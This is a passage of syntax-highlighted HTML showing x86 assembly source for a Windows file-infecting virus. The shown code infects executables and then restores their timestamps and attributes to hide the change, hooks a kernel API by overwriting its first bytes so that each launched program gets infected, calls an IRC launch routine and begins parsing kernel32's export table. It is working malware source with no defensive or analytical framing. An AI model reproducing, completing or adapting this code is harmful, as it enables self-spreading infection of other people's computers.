    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; set file pointer to </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; beginning + filesize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; = end of file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASetFilePointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; set EOF equal to current</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASetEndOfFile</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; filepointer position</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

</span><span class="sc1">;--------------------------------[ close file ]------------------------------;</span><span class="sc0">

    </span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata.fd_ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata.fd_ftLastAccessTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata.fd_ftCreationTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASetFileTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc5">InfectionError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata.fd_dwFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata.fd_cFileName</span><span class="sc4">]</span><span class="sc0">    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASetFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">INFECT_FILE</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">RESIDENT_CP</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> 

     </span><span class="sc5">InterceptCP</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetApiDelta</span><span class="sc0">

     </span><span class="sc5">GetApiDelta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetApiDelta</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FIND_GETPROCADDRESS_API_ADDRESS</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FIND_USER32_BASE_ADDRESS</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RESIDENT_CP2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IRC_LAUNCH</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

     </span><span class="sc5">GetNewDelta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">NewDelta</span><span class="sc0">

     </span><span class="sc5">NewDelta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewDelta</span><span class="sc0">

     </span><span class="sc5">RestoreApiCode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cp_oldapicodeaddress</span><span class="sc4">]</span><span class="sc0">           
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cp_oldapicode</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">returnaddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cp_oldapicodeaddress</span><span class="sc4">]</span><span class="sc0">

     </span><span class="sc5">ReHookApi</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetNewDelta2</span><span class="sc0">

     </span><span class="sc5">GetNewDelta2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetNewDelta2</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cp_oldapicodeaddress</span><span class="sc4">]</span><span class="sc0">           
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cp_newapicode</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

     </span><span class="sc5">ReturnToOriginalCaller</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
    </span><span class="sc5">returnaddress</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">RESIDENT_CP</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">RESIDENT_CP2</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">CheckForEmptyCommandLine</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">
                             
    </span><span class="sc5">ExtractFileName</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">         
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">FileNameNormal</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc5">GetFileNamePartBetweenQuotes</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">GetBetweenQuotes</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">FileNameEndNotFound</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetFileNamePartBetweenQuotes</span><span class="sc0">
    
    </span><span class="sc5">GetBetweenQuotes</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; esi hold start of filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">; ecx holds size of filename</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">StoreFileName</span><span class="sc0">

    </span><span class="sc5">FileNameNormal</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc5">GetNormalFileName</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FoundNormalFileName</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">FileNameEndNotFound</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetNormalFileName</span><span class="sc0">

    </span><span class="sc5">FoundNormalFileName</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; esi hold start of filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">; ecx holds size of filename</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">StoreFileName</span><span class="sc0">
    
    </span><span class="sc5">FileNameEndNotFound</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">

    </span><span class="sc5">StoreFileName</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filenamebuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filenamebuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc5">CheckForRem</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filenamebuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'er'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">FindFirstFile</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'me'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">

    </span><span class="sc5">FindFirstFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; win32 finddata structure</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filenamebuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AFindFirstFile</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; find the file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">             </span><span class="sc1">; file was not found</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">InfectThisFile</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata.fd_cFileName</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">CheckFileName</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'mmud'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">InfectThisFile</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CheckFileName</span><span class="sc0">

    </span><span class="sc5">InfectThisFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata.fd_nFileSizeLow</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ecx = filesize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">; save the filesize</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Leap</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">           </span><span class="sc1">; filesize + virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; + workspace = memory</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">INFECT_FILE</span><span class="sc0">

    </span><span class="sc5">Continue</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">RESIDENT_CP2</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">HOOK_API</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> 

    </span><span class="sc1">; IN: hookstruct:</span><span class="sc0">
    </span><span class="sc1">;   00 : offset api name</span><span class="sc0">
    </span><span class="sc1">;   04 : old apicodeaddress</span><span class="sc0">
    </span><span class="sc1">;   08 ; offset for old apicode</span><span class="sc0">
    </span><span class="sc1">;   12 ; offset for new apicode</span><span class="sc0">
    </span><span class="sc1">;   16 : new apicodeaddress</span><span class="sc0">
        
    </span><span class="sc5">FindKernelExportTable</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">
   
    </span><span class="sc5">GetNecessaryData</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">          
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">numberofnames</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; save number of names</span><span class="sc0">
